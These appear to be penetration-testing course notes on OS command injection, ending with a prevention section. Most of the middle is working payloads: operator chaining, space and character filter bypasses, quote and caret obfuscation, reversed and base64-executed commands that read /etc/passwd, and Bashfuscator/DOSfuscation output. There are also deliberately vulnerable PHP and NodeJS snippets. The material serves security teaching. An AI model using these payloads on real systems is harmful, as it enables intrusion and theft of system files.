## Intro to Command Injections

Command injection executes OS commands on the back-end server through unsanitized user input. Full network compromise can follow.

### What are Injections

Injection is OWASP Top 10 risk #3. User input is interpreted as part of the executed query or code, changing the intended outcome.

Common injection classes include OS command injection, code injection, SQL injection, and Cross-Site Scripting/HTML injection. Others include LDAP, NoSQL, HTTP header, XPath, IMAP, and ORM injection.

### OS Command Injections

User input must reach a function that executes system commands. The vulnerability is not limited to web apps; binaries and thick clients are vulnerable when they pass unsanitized input to command-execution functions.

### PHP Example

PHP command-execution functions include `exec`, `system`, `shell_exec`, `passthru`, and `popen`.

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

`filename` goes directly into `system()`.

### NodeJS Example

NodeJS may use `child_process.exec` or `child_process.spawn`.

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

`req.query.filename` goes directly into the executed command.

## Detection

Basic detection and exploitation are the same: append a command and watch for changed output. Advanced cases may require fuzzing or code review.

### Command Injection Detection

A Host Checker utility likely runs:

```bash
ping -c 1 OUR_INPUT
```

If input is not sanitized or escaped, additional commands can be appended.

### Command Injection Methods

Semicolon `;` URL-encodes to `%3b` and executes both commands. New line `\n` encodes to `%0a` and executes both commands. Background `&` encodes to `%26`, executes both, and usually shows the second output first. Pipe `|` encodes to `%7c`, executes both, but only shows the second output. AND `&&` encodes to `%26%26` and executes both only if the first command succeeds. OR `||` encodes to `%7c%7c` and executes the second only if the first fails. Sub-shell backticks `` `` `` encode to `%60%60`, and sub-shell `$()` encodes to `%24%28%29`; both are Linux-only and execute both commands.

These operators generally work across languages, frameworks, and back-end operating systems. Semicolon does not work in Windows CMD, but works in PowerShell.

SQL injection operators include `'`, `,`, `;`, `--`, `/*`, `*/`. Command injection operators include `;` and `&&`. LDAP injection operators include `*`, `(`, `)`, `&`, and `|`. XPath injection operators include `'`, `or`, `and`, `not`, `substring`, `concat`, and `count`. OS command injection operators include `;`, `&`, and `|`. Code injection operators include `'`, `;`, `--`, `/*`, `*/`, `$()`, `${}`, `#{}`, `%{}`, and `^`. Directory traversal operators include `../`, `..\`, and `%00`. Object injection operators include `;`, `&`, and `|`. XQuery injection operators include `'`, `;`, `--`, `/*`, `*/`. Shellcode injection operators include `\x`, `\u`, `%u`, and `%n`. Header injection operators include `\n`, `\r\n`, `\t`, `%0d`, `%0a`, and `%09`. The set is incomplete and environment-dependent.

## Injecting Commands

### Injecting Our Command

Semicolon payload:

```bash
ping -c 1 127.0.0.1; whoami
```

If the front-end rejects non-IP input and Firefox Developer Tools shows no request, validation is client-side. Open the Network tab with `CTRL + SHIFT + E`.

### Bypassing Front-End Validation

Proxy the request through Burp Suite or ZAP. Send a normal request, intercept it, send it to Repeater with `CTRL + R`, modify the payload, URL-encode the payload with `CTRL + U`, then send.

Payload:

```text
127.0.0.1; whoami
```

URL-encoded form:

```text
127.0.0.1%3b%20whoami
```

### Other Injection Operators

### AND Operator

```bash
ping -c 1 127.0.0.1 && whoami
```

URL-encoded payload:

```text
127.0.0.1+%26%26+whoami
```

The second command runs only if the first succeeds.

### OR Operator

```bash
ping -c 1 127.0.0.1 || whoami
```

The first command succeeds, so `whoami` does not run.

Break the first command:

```bash
ping -c 1 || whoami
```

`ping` fails, so `whoami` runs.

URL-encoded minimal payload:

```text
|| whoami
```

## Identifying Filters

### Filter/WAF Detection

`Invalid input` rendered inside the application output usually indicates an application-level filter. A separate error page containing request metadata or client IP may indicate a WAF.

Test payload:

```bash
127.0.0.1; whoami
```

Possible triggers: `;`, space, or `whoami`.

### Blacklisted Characters

Example PHP character blacklist:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

### Identifying Blacklisted Character

Reduce the payload one character at a time. If `127.0.0.1` works but `127.0.0.1;` fails, semicolon is blacklisted.

## Bypassing Space Filters

### Bypass Blacklisted Operators

New line is often not blacklisted. URL-encoded newline:

```text
127.0.0.1%0a
```

### Bypass Blacklisted Spaces

If this fails:

```text
127.0.0.1%0a whoami
```

Test the space alone:

```text
127.0.0.1%0a 
```

If it fails, space is blacklisted.

### Using Tabs

Tab replaces space:

```text
127.0.0.1%0a%09whoami
```

### Using $IFS

`${IFS}` defaults to space/tab and works between arguments:

```text
127.0.0.1%0a${IFS}whoami
```

### Using Brace Expansion

Bash brace expansion inserts spaces between brace-wrapped arguments:

```bash
{ls,-la}
```

Injection form:

```text
127.0.0.1%0a{ls,-la}
```

PayloadsAllTheThings documents additional no-space command techniques.

## Bypassing Other Blacklisted Characters

### Linux

Environment variables can produce filtered characters by substring.

```bash
echo ${PATH}
```

Example output:

```text
/usr/local/bin:/usr/bin:/bin:/usr/games
```

Extract slash:

```bash
echo ${PATH:0:1}
```

Output:

```text
/
```

`$HOME` or `$PWD` can also work.

Extract semicolon:

```bash
echo ${LS_COLORS:10:1}
```

Output:

```text
;
```

In payloads, omit `echo`; use the expansion directly. `printenv` lists variables that may contain useful characters.

Payload using extracted semicolon and `${IFS}`:

```text
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
```

### Windows

CMD substring extraction:

```cmd
echo %HOMEPATH:~6,-11%
```

Output:

```text
\
```

PowerShell character indexing:

```powershell
$env:HOMEPATH[0]
```

Output:

```text
\
```

Another example:

```powershell
$env:PROGRAMFILES[10]
```

`Get-ChildItem Env:` lists PowerShell environment variables.

### Character Shifting

`man ascii` can identify adjacent characters. Backslash is ASCII 92; `[` is 91.

```bash
man ascii
echo $(tr '!-}' '"-~'<<<[)
```

Output:

```text
\
```

The same idea works in PowerShell, though commands are longer. To produce `;`, shift the character immediately before it in ASCII.

## Bypassing Blacklisted Commands

### Commands Blacklist

Example PHP command blacklist:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

Exact-match blacklists can be bypassed by obfuscating command strings.

### Linux & Windows

Quotes are ignored by shells when inserted inside commands.

```bash
w'h'o'am'i
```

```bash
w"h"o"am"i
```

Do not mix quote types. Quote count must be even.

Injection payload:

```text
127.0.0.1%0aw'h'o'am'i
```

### Linux Only

Backslash and `$@` can also be inserted:

```bash
who$@ami
```

```bash
w\ho\am\i
```

Count does not need to be even.

### Windows Only

Caret can be inserted in CMD commands:

```cmd
who^ami
```

## Advanced Command Obfuscation

### Case Manipulation

Windows CMD and PowerShell are case-insensitive:

```powershell
WhOaMi
```

Linux bash is case-sensitive. Convert mixed case to lowercase before execution:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

If spaces are filtered, replace them with tabs:

```text
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

Alternative:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

### Reversed Commands

Reverse the command first:

```bash
echo 'whoami' | rev
```

Output:

```text
imaohw
```

Execute through reversal:

```bash
$(rev<<<'imaohw')
```

If character filters apply, reverse filtered characters too or include them before reversing.

PowerShell reverse:

```powershell
"whoami"[-1..-20] -join ''
```

Output:

```text
imaohw
```

Execute:

```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands

Base64-encode the payload:

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
```

Output:

```text
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Decode and execute. `<<<` avoids using a filtered pipe:

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

If `bash` or `base64` is filtered, use `sh`, `openssl`, or `xxd` alternatives.

Windows PowerShell base64 encoding:

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

Output:

```text
dwBoAG8AYQBtAGkA
```

Linux can produce the same UTF-16LE base64:

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

PowerShell decode and execute:

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

Wildcards, regex, output redirection, and integer expansion are additional obfuscation options.

## Evasion Tools

### Linux (Bashfuscator)

Bashfuscator (https://github.com/Bashfuscator/Bashfuscator) automates bash obfuscation.

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
cd ./bashfuscator/bin/
```

Help:

```bash
./bashfuscator -h
```

Basic obfuscation:

```bash
./bashfuscator -c 'cat /etc/passwd'
```

Shorter, simpler output:

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

Example generated payload:

```bash
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
```

Test:

```bash
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```

### Windows (DOSfuscation)

DOSfuscation (https://github.com/danielbohannon/Invoke-DOSfuscation.git) is an interactive PowerShell obfuscation tool.

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

Interactive usage:

```powershell
help
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1
```

Example generated payload:

```cmd
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

Run in CMD:

```cmd
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

DOSfuscation can also run through `pwsh` on Linux.

## Command Injection Prevention

### System Commands

Avoid command-execution functions when possible. Use language-native functions instead. For host liveness checks in PHP, use `fsockopen` rather than `ping` through `system()`.

If system commands are unavoidable, never pass raw user input to them. Validate and sanitize on the back-end, and restrict usage to necessary cases.

### Input Validation

Validate on both front-end and back-end. Input must match the expected format.

PHP IP validation:

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

Regex validation with `preg_match` works for non-standard formats.

JavaScript IP validation:

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

NodeJS can use libraries such as `is-ip`, installed through npm, then call `isIp(ip)`.

### Input Sanitization

Sanitize after validation. Remove unnecessary special characters. Blacklisting words is weak.

PHP:

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

JavaScript:

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

NodeJS DOMPurify:

```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

When special characters must be allowed, escape them. PHP can use `escapeshellcmd`; NodeJS can use `escape(ip)`. Escaping is often bypassable and should not be the only control.

### Server Configuration

Use the web server's built-in WAF, such as Apache `mod_security`, plus an external WAF such as Cloudflare, Fortinet, or Imperva. Run the web server as a low-privileged user such as `www-data`. Disable dangerous PHP functions with `disable_functions=system,...`. Restrict PHP filesystem scope with `open_basedir = '/var/www/html'`. Reject double-encoded requests and non-ASCII characters in URLs. Avoid sensitive or outdated libraries and modules, such as PHP CGI. Penetration test after hardening, because a single unsafe line can still introduce command injection.